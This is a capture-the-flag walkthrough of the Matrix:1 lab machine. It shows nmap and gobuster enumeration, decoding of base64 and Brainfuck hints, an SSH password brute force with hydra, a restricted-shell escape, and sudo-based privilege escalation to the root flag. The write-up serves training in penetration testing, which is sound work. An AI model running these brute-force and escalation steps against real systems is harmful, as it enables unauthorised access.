Matrix:1 is a machine in which I used Enumeration to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.

## Scanning
As always, I started scanning with Nmap

```
root@kali:/home/kali# nmap -sC -sV 192.168.198.139
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 00:30 EDT

Interesting two http services!
## Web Enumeration
Then I enumerated directories and files using gobuster on both services but there is no useful information

```
root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.139 -x php,html,json,py,matrix

Nothing really important here.
## Inspecting Element
So, I started digging in the http services in port 80 and 3117. I found a base64 encoded text while inspecting element on port 31337.

![Username]/assets/image/002/1.png)

## Cracking

After decoding

![Username](/assets/image/002/2.png)

so I visted http://192.168.198.139:1337/Cypher.matrix , a filed was downloaded which contained this strange ciphertext

![Username](/assets/image/002/3.png)

I used online crypto Identifier and the text was identified as Brainfuck Endcoding

![Username](/assets/image/002/4.png)

So I used another online tool to decode the text

![Username](/assets/image/002/5.png)

The text contains our password with missing two letters so I used an online combination
maker and prefix adder to make my wordlist
![Username](//assets/image/002/6.png)

Then I used hydra to bruteforce the ssh password

```
hydra -f -l guest -P Downloads/output.txt ssh://192.168.198.139
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

## Privilege Escalation
When I sshed to the user guest, it gave me a restricted shell so I bypassed the restriction by using this command

```
root@kali:/home/kali# ssh guest@192.168.198.139 -t bash

```

I ran diffreent Enumeration scripts and found an intersting sudo privilege which allows us to run all commands

```
guest@porteus:/tmp$ sudo -l
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp

```

So

```
guest@porteus:/tmp$ sudo su
Password: 
root@porteus:/tmp# cat /root/flag.txt 
   _,-.                                                             
,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE

              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION    

```
and voila here is the root privilege!
